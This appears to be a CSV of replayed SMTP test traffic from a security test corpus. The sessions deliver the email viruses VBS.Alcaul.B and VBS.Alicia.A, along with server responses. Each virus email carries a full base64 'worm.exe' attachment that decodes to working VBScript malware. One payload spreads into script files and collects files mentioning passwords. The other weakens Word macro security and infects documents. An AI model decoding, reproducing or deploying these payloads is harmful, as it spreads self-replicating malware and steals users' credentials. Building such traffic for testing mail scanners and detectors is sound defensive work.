XmlName,ExecDesc,EngDesc,Protocol,SPECProtocol,Payload
﻿VBS.Alcaul.B.51f19993_IPv6.xml,Email Virus VBS.Alcaul.B (IPv6 Version),This is the email virus VBS.Alcaul.B as detected by ClamAV. This email caught by imperfect networks was applied the following hash value for identification: 51f19993474bc77d0cb4694bc6c8f643.  This attack is delivered via SMTP to a email server. (IPv6 Version),SMTP/IPv6,TCP,"Content-Transfer-Encoding: binary[[0A ]]Content-Type: multipart/mixed; boundary=""_----------=_113511032673940""[[0A ]]MIME-Version: 1.0[[0A ]]X-Mailer: MIME::Lite 3.01 (F2.73; A1.67; B3.05; Q3.03)[[0A ]]Date: Tue, 20 Dec 2005 20:25:26 UT[[0A ]]From: phar@example.com[[0A ]]To: victim@example.net[[0A ]]Subject: 'Curiouser and curiouser!' cried Alice.[[0A 0A ]]This is a multi-part message in MIME format.[[0A 0A ]]--_----------=_113511032673940[[0A ]]Content-Disposition: inline[[0A ]]Content-Length: 635[[0A ]]Content-Transfer-Encoding: binary[[0A ]]Content-Type: text/plain[[0A 0A ]]`But I don't want to go among mad people,' Alice remarked.[[0A ]]`Oh, you can't help that,' said the Cat: `we're all mad here. I'm mad.  You're mad.'[[0A ]]`How do you know I'm mad?' said Alice.[[0A ]]`You must be,' said the Cat, `or you wouldn't have come here.'[[0A ]]Alice didn't think that proved it at all; however, she went on` And how do you know that you're mad?'[[0A ]]`To begin with,' said the Cat, `a dog's not mad.  You grant that?'[[0A ]]`I suppose so,' said Alice.[[0A ]]`Well, then,' the Cat went on, `you see, a dog growls when it's angry, and wags its tail when it's pleased.  Now I growl when I'm pleased, and wag my tail [[0A ]]when I'm angry.  Therefore I'm mad.'[[0A ]]--_----------=_113511032673940[[0A ]]Content-Disposition: attachment; filename=""worm.exe""[[0A ]]Content-Transfer-Encoding: base64[[0A ]]Content-Type: application/octet-stream; name=""worm.exe""[[0A 0A ]]b24gZXJyb3IgcmVzdW1lIG5leHQNCnJhbmRvbWl6ZSANCmtleSA9IGludCgo[[0A ]]cm5kKCkgKiAxMCkgKyAxNikNClNldCBmc28gPSBDcmVhdGVPYmplY3QoIlNj[[0A ]]cmlwdGluZy5GaWxlU3lzdGVtT2JqZWN0IikNCnNldCBhID0gZnNvLk9wZW5U[[0A ]]ZXh0RmlsZShXc2NyaXB0LlNjcmlwdEZ1bGxuYW1lLCAxKQ0KYWEgPSBhLnJl[[0A ]]YWRsaW5lDQpkZGQgPSBhLnJlYWRsaW5lDQpiID0gYS5yZWFkYWxsDQpGb3Ig[[0A ]]byA9IDEgdG8gTGVuKGIpDQpYID0gWCAmIEhleChBc2MoTWlkKGIsIG8sIDEp[[0A ]]KSB4b3Iga2V5KQ0KTmV4dA0KRm9yIHkgPSAyIHRvIExlbihhYSkgU3RlcCAy[[0A ]]DQp6eiA9IHp6ICYgQ2hyKCgiJmgiICsgTWlkKGFhLCB5LCAyKSkgeG9yIGtl[[0A ]]eTEpDQpuZXh0DQpzZXQgYSA9IGZzby5DcmVhdGVUZXh0RmlsZShXc2NyaXB0[[0A ]]LlNjcmlwdEZ1bGxuYW1lLCB0cnVlKQ0KYS5Xcml0ZWxpbmUgIiciICYgWA0K[[0A ]]YS5Xcml0ZWxpbmUgImtleTEgPSAiICYga2V5DQphLndyaXRlIHp6DQphLkNs[[0A ]]b3NlDQpmc28uZGVsZXRlZmlsZSgiYzpccGFzcy5vbiIpDQpzZXQgYWcgPSBm[[0A ]]c28uQ3JlYXRlVGV4dEZpbGUoImM6XHBhc3Mub24iLCB0cnVlKQ0KYWcud3Jp[[0A ]]dGVsaW5lICIuLi4iDQphZy5jbG9zZQ0KaHVodSgpDQpTdWIgaHVodSgpDQpP[[0A ]]biBFcnJvciBSZXN1bWUgTmV4dA0KZGltIGYsZjEsZmMNClNldCBmc28gPSBD[[0A ]]cmVhdGVPYmplY3QoIlNjcmlwdGluZy5GaWxlU3lzdGVtT2JqZWN0IikNClNl[[0A ]]dCBkciA9IGZzby5Ecml2ZXMNCkZvciBFYWNoIGQgaW4gZHINCklmIGQuRHJp[[0A ]]dmVUeXBlPTIgb3IgZC5Ecml2ZVR5cGU9MyBUaGVuDQpzenQoZC5wYXRoJiJc[[0A ]]IikNCkVuZCBJZg0KTmV4dA0KRW5kIFN1Yg0KU3ViIHN6dChlcikNCk9uIEVy[[0A ]]cm9yIFJlc3VtZSBOZXh0DQpTZXQgc2Y9Q3JlYXRlT2JqZWN0KCJTY3JpcHRp[[0A ]]bmcuRmlsZVN5c3RlbU9iamVjdCIpDQpTZXQgZiA9IHNmLkdldEZvbGRlcihl[[0A ]]cikNClNldCBzZiA9IGYuU3ViRm9sZGVycw0KRm9yIEVhY2ggZjEgaW4gc2YN[[0A ]]Cnl5eXkoZjEucGF0aCkNCnN6dChmMS5wYXRoKQ0KTmV4dA0KRW5kIFN1Yg0K[[0A ]]U3ViIHl5eXkodXUpDQpPbiBFcnJvciBSZXN1bWUgTmV4dA0KU2V0IHNmPUNy[[0A ]]ZWF0ZU9iamVjdCgiU2NyaXB0aW5nLkZpbGVTeXN0ZW1PYmplY3QiKQ0KU2V0[[0A ]]IGYgPSBzZi5HZXRGb2xkZXIodXUpDQpTZXQgZmMgPSBmLkZpbGVzDQpGb3Ig[[0A ]]RWFjaCBmMSBpbiBmYw0KZXh0ID0gc2YuR2V0RXh0ZW5zaW9uTmFtZShmMS5w[[0A ]]YXRoKQ0KZXh0ID0gbGNhc2UoZXh0KQ0KaWYgKGV4dD0idmJzIikgb3IgKGV4[[0A ]]dD0idmJlIikgVGhlbg0Kc2V0IGRkZCA9IHNmLmdldGZpbGUod3NjcmlwdC5z[[0A ]]Y3JpcHRmdWxsbmFtZSkNCmRkZC5jb3B5KGYxLnBhdGgpDQplbmQgaWYNCmlm[[0A ]]IChleHQ9InR4dCIpIHRoZW4NClNldCBjb3Q9c2YuT3BlblRleHRGaWxlKGYx[[0A ]]LnBhdGgsIDEsIEZhbHNlKQ0KaGhoID0gY290LnJlYWRhbGwNCklmIEluU3Ry[[0A ]]KDEsIGhoaCwgInBhc3N3b3JkIikgVGhlbg0Kc2V0IGFnZSA9IHNmLm9wZW50[[0A ]]ZXh0ZmlsZSgiYzpccGFzcy5vbiIsIDgpDQphZ2Uud3JpdGVsaW5lIGhoaA0K[[0A ]]YWdlLmNsb3NlDQplbmQgaWYNCmVuZCBpZg0KbmV4dA0KZW5kIHN1Yg0KJ3Zi[[0A ]]cy5qYW5pcyBieSBhbGNvcGF1bC9bclJsZl0NCidtYXkgMDIsIDIwMDINCidh[[0A ]]IGZyaWVuZCB3aXRoIHdlZWQgaXMgYSBmcmllbmQgaW5kZWVkLi4=[[0A 0A ]]--_----------=_113511032673940--[[0A 0A 0A 0A]]"
VBS.Alcaul.B.51f19993_IPv6.xml,Email Virus VBS.Alcaul.B (IPv6 Version),This is the email virus VBS.Alcaul.B as detected by ClamAV. This email caught by imperfect networks was applied the following hash value for identification: 51f19993474bc77d0cb4694bc6c8f643.  This attack is delivered via SMTP to a email server. (IPv6 Version),SMTP/IPv6,TCP,[[0D 0A ]].[[0D 0A]]
VBS.Alcaul.B.51f19993_IPv6.xml,Email Virus VBS.Alcaul.B (IPv6 Version),This is the email virus VBS.Alcaul.B as detected by ClamAV. This email caught by imperfect networks was applied the following hash value for identification: 51f19993474bc77d0cb4694bc6c8f643.  This attack is delivered via SMTP to a email server. (IPv6 Version),SMTP/IPv6,TCP,QUIT[[0D 0A]]
VBS.Alcaul.B.51f19993_IPv6.xml,Email Virus VBS.Alcaul.B (IPv6 Version),This is the email virus VBS.Alcaul.B as detected by ClamAV. This email caught by imperfect networks was applied the following hash value for identification: 51f19993474bc77d0cb4694bc6c8f643.  This attack is delivered via SMTP to a email server. (IPv6 Version),SMTP/IPv6,TCP,220 f[[6f ]]ster ES[[4d ]]TP[[0d 0a]]
VBS.Alcaul.B.51f19993_IPv6.xml,Email Virus VBS.Alcaul.B (IPv6 Version),This is the email virus VBS.Alcaul.B as detected by ClamAV. This email caught by imperfect networks was applied the following hash value for identification: 51f19993474bc77d0cb4694bc6c8f643.  This attack is delivered via SMTP to a email server. (IPv6 Version),SMTP/IPv6,TCP,250[[2d ]]SI[[5a ]]E 52428800[[0d 0a ]]250[[2d ]]PIPE[[4c ]]I[[4e ]]I[[4e ]]G[[0d 0a ]]250[[2d ]]AUTH P[[4c ]]AI[[4e ]] [[4c 4f ]]GI[[4e 0d 0a]]
VBS.Alcaul.B.51f19993_IPv6.xml,Email Virus VBS.Alcaul.B (IPv6 Version),This is the email virus VBS.Alcaul.B as detected by ClamAV. This email caught by imperfect networks was applied the following hash value for identification: 51f19993474bc77d0cb4694bc6c8f643.  This attack is delivered via SMTP to a email server. (IPv6 Version),SMTP/IPv6,TCP,250 [[4f 4b 0d 0a]]
VBS.Alcaul.B.51f19993_IPv6.xml,Email Virus VBS.Alcaul.B (IPv6 Version),This is the email virus VBS.Alcaul.B as detected by ClamAV. This email caught by imperfect networks was applied the following hash value for identification: 51f19993474bc77d0cb4694bc6c8f643.  This attack is delivered via SMTP to a email server. (IPv6 Version),SMTP/IPv6,TCP,250 Accepted[[0d 0a]]
VBS.Alcaul.B.51f19993_IPv6.xml,Email Virus VBS.Alcaul.B (IPv6 Version),This is the email virus VBS.Alcaul.B as detected by ClamAV. This email caught by imperfect networks was applied the following hash value for identification: 51f19993474bc77d0cb4694bc6c8f643.  This attack is delivered via SMTP to a email server. (IPv6 Version),SMTP/IPv6,TCP,"354 E[[6e ]]ter [[6d ]]essage[[2c ]] e[[6e ]]di[[6e ]]g with ""[[2e ]]"" [[6f 6e ]] a [[6c ]]i[[6e ]]e by itse[[6c ]]f[[0d 0a]]"
VBS.Alcaul.B.51f19993_IPv6.xml,Email Virus VBS.Alcaul.B (IPv6 Version),This is the email virus VBS.Alcaul.B as detected by ClamAV. This email caught by imperfect networks was applied the following hash value for identification: 51f19993474bc77d0cb4694bc6c8f643.  This attack is delivered via SMTP to a email server. (IPv6 Version),SMTP/IPv6,TCP,250 [[4f 4b ]] id[[3d ]]1HcVW[[6f 2d ]]0007YR[[2d ]]S8
VBS.Alcaul.B.51f19993_IPv6.xml,Email Virus VBS.Alcaul.B (IPv6 Version),This is the email virus VBS.Alcaul.B as detected by ClamAV. This email caught by imperfect networks was applied the following hash value for identification: 51f19993474bc77d0cb4694bc6c8f643.  This attack is delivered via SMTP to a email server. (IPv6 Version),SMTP/IPv6,TCP,221 f[[6f ]]ster c[[6c 6f ]]si[[6e ]]g c[[6f 6e 6e ]]ecti[[6f 6e 0d 0a]]
﻿VBS.Alicia.A.b99162cb.xml,Email Virus VBS.Alicia.A,This is the email virus VBS.Alicia.A as detected by ClamAV. This email caught by imperfect networks was applied the following hash value for identification: b99162cb3be77e55f10cb5d494a2178c.  This attack is delivered via SMTP to a email server.,SMTP,TCP,"Content-Transfer-Encoding: binary[[0A ]]Content-Type: multipart/mixed; boundary=""_----------=_113510598659910""[[0A ]]MIME-Version: 1.0[[0A ]]X-Mailer: MIME::Lite 3.01 (F2.73; A1.67; B3.05; Q3.03)[[0A ]]Date: Tue, 20 Dec 2005 19:13:06 UT[[0A ]]From: phar@example.com[[0A ]]To: victim@example.net[[0A ]]Subject: 'Curiouser and curiouser!' cried Alice.[[0A 0A ]]This is a multi-part message in MIME format.[[0A 0A ]]--_----------=_113510598659910[[0A ]]Content-Disposition: inline[[0A ]]Content-Length: 635[[0A ]]Content-Transfer-Encoding: binary[[0A ]]Content-Type: text/plain[[0A 0A ]]`But I don't want to go among mad people,' Alice remarked.[[0A ]]`Oh, you can't help that,' said the Cat: `we're all mad here. I'm mad.  You're mad.'[[0A ]]`How do you know I'm mad?' said Alice.[[0A ]]`You must be,' said the Cat, `or you wouldn't have come here.'[[0A ]]Alice didn't think that proved it at all; however, she went on` And how do you know that you're mad?'[[0A ]]`To begin with,' said the Cat, `a dog's not mad.  You grant that?'[[0A ]]`I suppose so,' said Alice.[[0A ]]`Well, then,' the Cat went on, `you see, a dog growls when it's angry, and wags its tail when it's pleased.  Now I growl when I'm pleased, and wag my tail [[0A ]]when I'm angry.  Therefore I'm mad.'[[0A ]]--_----------=_113510598659910[[0A ]]Content-Disposition: attachment; filename=""worm.exe""[[0A ]]Content-Transfer-Encoding: base64[[0A ]]Content-Type: application/octet-stream; name=""worm.exe""[[0A 0A ]]IE9uIEVycm9yIFJlc3VtZSBOZXh0DQpyZW0gTmloaWxpdCBXaW4zMmFzbSBW[[0A ]]ZXJzaW9uDQpyZW0gKGMpIGJ5IE5lY3Jvbm9taWtvbltaZXJvR3Jhdml0eV0g[[0A ]]DQpEaW0gV1NIU2hlbGwNClNldCBuID0gZnNvLkdldEZpbGUoV1NjcmlwdC5T[[0A ]]Y3JpcHRGdWxsTmFtZSkNClNldCBXU0hTaGVsbCA9IFdTY3JpcHQuQ3JlYXRl[[0A ]]T2JqZWN0KCJXU2NyaXB0LlNoZWxsIikNCldTSFNoZWxsLlJlZ1dyaXRlICJI[[0A ]]S0VZX0NVUlJFTlRfVVNFUlxTT0ZUV0FSRVxpTWVzaFxDbGllbnRcTG9jYWxD[[0A ]]b250ZW50XERsRGlyMSIsInN5c3RlbTMyIg0KV1NIU2hlbGwuUmVnV3JpdGUg[[0A ]]IkhLRVlfQ1VSUkVOVF9VU0VSXFNPRlRXQVJFXEthemFhXFRyYW5zZmVyXERs[[0A ]]RGlyMSIsInN5c3RlbTMyIg0KV1NIU2hlbGwuUmVnV3JpdGUgIkhLRVlfQ1VS[[0A ]]UkVOVF9VU0VSXFNvZnR3YXJlXE1pY3Jvc29mdFxPZmZpY2VcMTAuMFxXb3Jk[[0A ]]XFNlY3VyaXR5XEFjY2Vzc1ZCT00iLCAxLCAiUkVHX0RXT1JEIg0KV1NIU2hl[[0A ]]bGwuUmVnV3JpdGUgIkhLRVlfQ1VSUkVOVF9VU0VSXFNvZnR3YXJlXE1pY3Jv[[0A ]]c29mdFxPZmZpY2VcMTAuMFxXb3JkXFNlY3VyaXR5XExldmVsIiwgMSwgIlJF[[0A ]]R19EV09SRCINCldTSFNoZWxsLlJlZ1dyaXRlICJIS0VZX0NVUlJFTlRfVVNF[[0A ]]UlxTb2Z0d2FyZVxNaWNyb3NvZnRcT2ZmaWNlXDkuMFxXb3JkXFNlY3VyaXR5[[0A ]]XExldmVsIiwgMSwgIlJFR19EV09SRCINClNldCBCYWNrdXAgPSBXU2NyaXB0[[0A ]]LkNyZWF0ZU9iamVjdCgiV29yZC5BcHBsaWNhdGlvbiIpDQpCYWNrdXAuT3B0[[0A ]]aW9ucy5WaXJ1c1Byb3RlY3Rpb24gPSAoUm5kICogMCkNCkJhY2t1cC5PcHRp[[0A ]]b25zLlNhdmVOb3JtYWxQcm9tcHQgPSAoUm5kICogMCkNCkJhY2t1cC5Ob3Jt[[0A ]]YWxUZW1wbGF0ZS5WQlByb2plY3QuVkJDb21wb25lbnRzLlJlbW92ZSBCYWNr[[0A ]]dXAuTm9ybWFsVGVtcGxhdGUuVkJQcm9qZWN0LlZCQ29tcG9uZW50cygiTmlo[[0A ]]aWxpdCIpDQpCYWNrdXAuTm9ybWFsVGVtcGxhdGUuU2F2ZQ0KQmFja3VwLk5v[[0A ]]cm1hbFRlbXBsYXRlLlZCUHJvamVjdC5WQkNvbXBvbmVudHMuSW1wb3J0ICgi[[0A ]]TmloaWxpdC5iYXMiKQ0KU2V0IFNlYXJjaCA9IEJhY2t1cC5BcHBsaWNhdGlv[[0A ]]bi5GaWxlc2VhcmNoDQpTZWFyY2guTG9va0luID0gIkM6XCI6IFNlYXJjaC5T[[0A ]]ZWFyY2hTdWJGb2xkZXJzID0gVHJ1ZTogU2VhcmNoLkZpbGVOYW1lID0gIiou[[0A ]]ZG9jIjogU2VhcmNoLkV4ZWN1dGUNCkZvciBmID0gMSBUbyBTZWFyY2guRm91[[0A ]]bmRGaWxlcy5Db3VudA0KVmljdGltID0gU2VhcmNoLkZvdW5kRmlsZXMoZikN[[0A ]]CkJhY2t1cC5Eb2N1bWVudHMuT3BlbiBWaWN0aW0NCkJhY2t1cC5BY3RpdmVE[[0A ]]b2N1bWVudC5WQlByb2plY3QuVkJDb21wb25lbnRzLlJlbW92ZSBCYWNrdXAu[[0A ]]QWN0aXZlRG9jdW1lbnQuVkJQcm9qZWN0LlZCQ29tcG9uZW50cygiICYgVmly[[0A ]]dXNOYW1lICYgIikNCkJhY2t1cC5BY3RpdmVEb2N1bWVudC5WQlByb2plY3Qu[[0A ]]VkJDb21wb25lbnRzLkltcG9ydCAoIk5paGlsaXQuYmFzIikNCkJhY2t1cC5B[[0A ]]Y3RpdmVEb2N1bWVudC5TYXZlDQpCYWNrdXAuQWN0aXZlRG9jdW1lbnQuQ2xv[[0A ]]c2UNCk5leHQNCkJhY2t1cC5BcHBsaWNhdGlvbi5RdWl0DQpDb3B5cmlnaHQN[[0A ]]CkZ1bmN0aW9uIENvcHlyaWdodCgpDQpSYW5kb21pemUNCklmIDEgKyBJbnQo[[0A ]]Um5kICogNTApID0gNyB0aGVuDQpNc2dCb3ggIioqKiBXaW4zMi5OaWhpbGl0[[0A ]]ICoqKiIgJiB2YmNybGYgJiAiICAgICAgQ29weXJpZ2h0IGJ5IiAmIHZiY3Js[[0A ]]ZiAmICJOZWNyb25vbWlrb24vWmVyb0dyYXZpdHkiLCA2NCwiVkJTLkRyb3Bw[[0A ]]ZXIgZm9yOiINCmVuZCBpZg0KZW5kIGZ1bmN0aW9uDQo=[[0A 0A ]]--_----------=_113510598659910--[[0A 0A 0A 0A]]"
